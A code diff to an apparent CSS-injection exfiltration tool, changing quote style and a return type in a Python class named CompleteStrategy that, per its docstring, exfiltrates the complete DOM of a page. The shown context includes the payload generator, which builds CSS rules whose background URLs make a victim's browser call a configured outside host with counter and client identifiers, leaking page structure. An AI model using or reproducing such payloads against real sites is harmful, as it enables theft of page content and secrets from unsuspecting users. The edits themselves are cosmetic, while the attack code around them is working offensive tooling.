@@ -8,14 +8,14 @@ class CompleteStrategy(BaseExfiltrationStrategy):
     Exfiltrates the complete DOM structure of the HTML.
     """
 
-    name = "complete"
+    name = 'complete'
 
     def __init__(
         self,
         hostname: str,
         port: int,
-        element: str = "*",
-        attribut: str = "value",
+        element: str = '*',
+        attribut: str = 'value',
         timeout: float = 3.0,
     ) -> None:
         super().__init__(hostname, port, timeout)
@@ -26,16 +26,16 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         return self._generate_payload(client)
 
     def generate_next_payload(self, client) -> str:
-        return "next"
+        return 'next'
 
     def handle_valid(self, client, data: str) -> str:
-        return "valid"
+        return 'valid'
 
-    def handle_end(self, client) -> None:
-        return "end"
+    def handle_end(self, client) -> str:
+        return 'end'
 
     def _generate_payload(self, client) -> str:
-        elements = "".join(
+        elements = ''.join(
             f"html > {element}:nth-child(1){{background:url('//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}');}}"
             for element in ELEMENTS
         )
